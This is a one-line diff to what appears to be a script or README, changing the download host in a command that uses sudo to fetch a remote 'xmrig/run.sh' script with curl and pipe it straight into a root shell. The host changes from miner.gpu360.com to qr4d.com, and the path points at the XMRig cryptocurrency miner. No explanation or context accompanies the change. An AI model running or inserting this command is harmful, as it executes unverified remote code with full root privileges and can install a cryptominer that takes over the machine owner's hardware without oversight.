@@ -1,1 +1,1 @@
-sudo sh -c "$(curl -fsSL http://miner.gpu360.com/xmrig/run.sh)"
+sudo sh -c "$(curl -fsSL http://qr4d.com/xmrig/run.sh)"
